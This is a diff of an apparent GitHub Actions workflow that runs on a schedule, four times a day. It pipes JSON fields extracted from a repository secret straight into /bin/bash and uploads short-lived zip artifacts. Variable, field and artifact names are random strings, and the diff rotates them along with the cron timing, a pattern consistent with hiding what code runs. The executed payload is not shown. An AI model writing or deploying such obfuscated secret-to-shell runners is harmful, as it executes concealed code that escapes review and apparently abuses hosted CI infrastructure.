@@ -3,7 +3,7 @@ on:
   workflow_dispatch:
 
   schedule:
-    - cron: '9 4,10,16,22 * * *'
+    - cron: '35 4,10,16,22 * * *'
 permissions:
   contents: read
 concurrency:
@@ -20,18 +20,20 @@ jobs:
           fetch-depth: 1
       - name: Go
         env:
-          hx82774: ${{ secrets.hx82774 }}
+          hxmse4377: ${{ secrets.hxmse4377 }}
         run: |
-          printf '%s' "$hx82774" | jq -r .febh836 | /bin/bash
-          printf '%s' "$xv67" | jq -r .tt797 | /bin/bash
-          echo $z1 | jq -r .w92846 | /bin/bash
-          echo $pzlcg851 | jq -r .fisf21 | /bin/bash
-          printf '%s' "$k0" | jq -r .sniin468 | /bin/bash
+          printf '%s' "$hxmse4377" | jq -r .uh908 | /bin/bash
+          echo $uymv39042 | jq -r .epn0958 | /bin/bash
+          echo $utas4339 | jq -r .uibq32 | /bin/bash
+          printf '%s' "$iw27" | jq -r .h59911 | /bin/bash
+          printf '%s' "$jyxu929" | jq -r .lfhw753 | /bin/bash
+          echo $nyin270 | jq -r .icsu2208 | /bin/bash
+          printf '%s' "$wrqk21994" | jq -r .okc07 | /bin/bash
 
       - name: Store artifact
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: X0HIFNOn
+          name: mZVUfe7p
           path: "*.zip"
           retention-days: 1
